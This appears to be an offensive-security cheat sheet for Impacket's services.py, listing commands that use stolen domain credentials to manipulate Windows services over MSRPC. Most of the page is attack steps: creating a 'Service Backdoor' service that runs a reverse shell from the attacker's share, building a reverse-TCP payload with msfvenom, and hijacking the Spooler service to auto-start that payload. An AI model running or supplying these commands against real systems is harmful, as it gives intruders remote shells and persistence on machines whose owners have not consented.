---
tags:
  - tool
---
# services

Interact with Windows services using the [MSRPC](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) interface. Non-interactive.

## Capabilities

```powershell
# List available services
services.py $DOMAIN/$USER:$PASSWD@$IP list

# Create a new backdoor service
services.py $DOMAIN/$USER:$PASSWD@$IP create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\$OUR_IP\\share\\rshell-9001.exe"

# Check service configuration
services.py $DOMAIN/$USER:$PASSWD@$IP config -name 'Service Backdoor'

# Start service
services.py $DOMAIN/$USER:$PASSWD@$IP start -name 'Service Backdoor'

# Delete remaining service
services.py $DOMAIN/$USER:$PASSWD@$IP delete -name 'Service Backdoor'

# Check existing configuration
services.py $DOMAIN/$USER:$PASSWD@$IP config -name Spooler

# Modify existing service (start_type 2 sets the service to AUTO START)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$OUR_IP LPORT=$PORT -f exe-service -o shell.exe
services.py $DOMAIN/$USER:$PASSWD@$IP change -name Spooler -path "\\\\$OUR_IP\\share\\shell.exe" -start_type 2

# Start service
services.py $DOMAIN/$USER:$PASSWD@$IP start -name Spooler
```
